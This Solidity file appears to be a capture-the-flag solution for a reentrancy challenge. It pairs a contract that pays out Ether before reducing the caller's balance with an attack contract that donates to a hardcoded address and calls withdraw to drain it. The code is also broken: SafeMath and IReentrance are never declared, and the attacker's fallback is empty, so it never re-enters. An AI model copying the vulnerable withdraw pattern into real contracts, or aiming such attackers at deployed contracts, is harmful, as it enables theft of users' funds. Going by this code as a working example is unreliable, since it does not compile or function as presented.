
pragma solidity ^0.8.0;

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttack {
    address payable immutable deployer;
    IReentrance reentrance;

    constructor() payable {
        deployer = payable(msg.sender);
        reentrance = IReentrance(0x38fc379647e373dA9bbb1B01B14C0586E77d0D1E);
        uint256 amount = address(this).balance;
        reentrance.donate{value: amount}(address(this));
        reentrance.withdraw(amount);
    }

    
    fallback() external payable {
        
    }
}
